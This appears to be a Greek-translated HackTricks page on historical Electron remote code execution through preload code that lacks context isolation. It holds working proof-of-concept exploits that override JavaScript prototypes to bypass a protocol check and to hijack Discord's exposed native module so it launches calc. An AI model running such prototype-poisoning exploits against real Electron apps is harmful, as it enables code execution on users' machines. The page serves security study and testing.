# Electron contextIsolation RCE via preload code

{{#include ../../banners/hacktricks-training.md}}

Αυτές είναι **ιστορικές αλυσίδες**, στις οποίες ο κώδικας preload μοιραζόταν JavaScript intrinsics ή προνομιούχα APIs με περιεχόμενο renderer που ελεγχόταν από εισβολέα. Όταν είναι ενεργοποιημένο το context isolation, το preload και η σελίδα έχουν συνήθως ξεχωριστά JavaScript realms, επομένως οι υπερισχύσεις πρωτοτύπων στη σελίδα δεν επηρεάζουν αυτόματα τα αντικείμενα του preload. Επαληθεύστε την αλυσίδα με βάση την ακριβή έκδοση του Electron/της εφαρμογής και την υλοποίηση του bridge.<sup>[[3]](#references)</sup>

## Παράδειγμα 1

Παράδειγμα από [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Αυτός ο κώδικας ανοίγει συνδέσμους http(s) με το προεπιλεγμένο πρόγραμμα περιήγησης:

![Electron contextIsolation RCE via preload code - Παράδειγμα 1: Αυτός ο κώδικας ανοίγει συνδέσμους http(s) με το προεπιλεγμένο πρόγραμμα περιήγησης](<../../images/image (768).png>)

Στην επηρεαζόμενη ιστορική εφαρμογή, μια πλοήγηση σε τοπικό αρχείο, όπως `file:///C:/Windows/System32/calc.exe`, μπορούσε να καταλήξει σε διαδρομή εκκίνησης του λειτουργικού συστήματος· το `SAFE_PROTOCOLS.indexOf` προοριζόταν να την αποτρέψει.

Επομένως, ένας εισβολέας μπορούσε να εισαγάγει αυτόν τον κώδικα JS μέσω XSS ή αυθαίρετης πλοήγησης σε σελίδα:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Καθώς η κλήση στο `SAFE_PROTOCOLS.indexOf` θα επιστρέφει πάντα 1337, ο attacker μπορεί να παρακάμψει την προστασία και να εκτελέσει το calc. Τελικό exploit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Ελέγξτε τις αρχικές διαφάνειες για άλλους τρόπους εκτέλεσης προγραμμάτων χωρίς να εμφανίζεται προτροπή για άδειες.<sup>[[1]](#references)</sup>

Η ιστορική αλυσίδα συζητήσεων στο Discord εξέτασε επίσης τη φόρτωση μέσω UNC-style `file://127.0.0.1/electron/rce.jar` ως μια ακόμη πιθανή οδό εκτέλεσης· επαληθεύστε αν είναι προσβάσιμη στη συγκεκριμένη έκδοση των Windows/Electron.<sup>[[2]](#references)</sup>

## Παράδειγμα 2: RCE στην εφαρμογή Discord

Παράδειγμα από [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Κατά τον έλεγχο των preload scripts, διαπίστωσα ότι το Discord εκθέτει στη σελίδα τη συνάρτηση που επιτρέπει την κλήση ορισμένων επιτρεπόμενων modules μέσω `DiscordNative.nativeModules.requireModule('MODULE-NAME')`.\
Εδώ, δεν μπορούσα να χρησιμοποιήσω modules που επιτρέπουν απευθείας RCE, όπως το module _child_process_, αλλά **εντόπισα κώδικα μέσω του οποίου μπορεί να επιτευχθεί RCE με την παράκαμψη των ενσωματωμένων μεθόδων της JavaScript** και την παρέμβαση στην εκτέλεση του εκτεθειμένου module.

Ακολουθεί το PoC. Μπόρεσα να επιβεβαιώσω ότι η εφαρμογή **calc** **εμφανίζεται** όταν κ**αλώ τη συνάρτηση `getGPUDriverVersions`** που ορίζεται στο module με την ονομασία "_discord_utils_" από το devTools, ενώ **παρακάμπτω τις `RegExp.prototype.test` και `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

Η συνάρτηση `getGPUDriverVersions` προσπαθεί να εκτελέσει το πρόγραμμα χρησιμοποιώντας τη βιβλιοθήκη "_execa_", όπως παρακάτω:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Συνήθως, το _execa_ προσπαθεί να εκτελέσει το "_nvidia-smi.exe_", το οποίο ορίζεται στη μεταβλητή `nvidiaSmiPath`. Ωστόσο, λόγω της υπε override των `RegExp.prototype.test` και `Array.prototype.join`, **το όρισμα αντικαθίσταται από "**_**calc**_**" κατά την εσωτερική επεξεργασία του _execa**_**.

Συγκεκριμένα, το όρισμα αντικαθίσταται μέσω της επίδρασης στις διαδρομές επίλυσης εντολών και επεξεργασίας ορισμάτων στον ιστορικό αναλυτή `cross-spawn`.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Κατάχρηση της έλλειψης απομόνωσης περιβάλλοντος - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE στην εφαρμογή Discord για υπολογιστές](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Απομόνωση περιβάλλοντος](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [Αναθεώρηση του αναλυτή `node-cross-spawn` και οι ακριβείς διαδρομές που χρησιμοποιεί η αλυσίδα (γραμμές 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
